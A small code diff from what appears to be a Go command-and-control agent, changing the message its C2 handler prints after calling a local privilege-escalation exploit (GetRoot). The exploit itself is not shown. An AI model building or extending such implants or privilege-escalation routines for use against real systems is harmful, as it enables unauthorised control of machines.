@@ -92,7 +92,7 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 			err = GetRoot()
 			out = fmt.Sprintf("Error: LPE exploit failed:\n%v", err)
 			if err == nil {
-				out = "Got root!"
+				out = "If you see agent goes online again, you got root!"
 			}
 		}
 		return
